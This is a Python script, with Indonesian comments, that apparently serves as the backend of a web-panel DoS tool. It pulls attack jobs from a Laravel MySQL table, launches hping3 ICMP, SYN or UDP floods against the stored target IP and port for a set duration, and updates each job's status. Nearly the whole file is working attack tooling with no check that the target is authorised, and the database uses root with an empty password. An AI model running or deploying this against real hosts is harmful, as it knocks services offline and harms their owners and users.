#!/usr/bin/env python3
import argparse
import subprocess
import pymysql
import time

# Konfigurasi database Laravel
DB_HOST = "127.0.0.1"
DB_USER = "root"
DB_PASSWORD = ""
DB_NAME = "nama_database_laravel"

def get_attack_data(attack_id):
    conn = pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME
    )
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    cursor.execute("SELECT * FROM attack_servers WHERE id = %s", (attack_id,))
    data = cursor.fetchone()
    conn.close()
    return data

def update_status(attack_id, status):
    conn = pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME
    )
    cursor = conn.cursor()
    cursor.execute("UPDATE attack_servers SET status=%s WHERE id=%s", (status, attack_id))
    conn.commit()
    conn.close()

def execute_attack(data):
    target_ip = data['ip_target']
    dos_type = data['dos_type']
    port = data['port']
    duration = data['durasi']
    data_size = data['data_size']

    # Tentukan perintah hping3 berdasarkan tipe serangan
    if dos_type.lower() == "icmp_flood":
        cmd = ["hping3", "-d", str(data_size * 1000), "-1", "--flood", target_ip]
    elif dos_type.lower() == "tcp_flood":
        cmd = ["hping3", "-d", str(data_size * 1000), "-S", "--flood", "-p", str(port), target_ip]
    elif dos_type.lower() == "udp_flood":
        cmd = ["hping3", "-d", str(data_size * 1000), "-2", "--flood", "-p", str(port), target_ip]
    else:
        raise ValueError("Unknown attack type: {dos+type}")

    print(f"Executing {dos_type} to {target_ip} for {duration} seconds...")
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Tunggu durasi yang ditentukan
    time.sleep(duration)

    # Hentikan proses
    process.terminate()
    print("Attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--id", type=int, required=True, help="ID serangan di database")
    args = parser.parse_args()

    # Ambil data serangan dari DB
    attack_data = get_attack_data(args.id)

    if not attack_data:
        print("Attack data not found!")
        exit(1)

    try:
        update_status(args.id, "Running")
        execute_attack(attack_data)
        update_status(args.id, "Completed")
    except Exception as e:
        print(f"Error: {e}")
        update_status(args.id, "Failed")
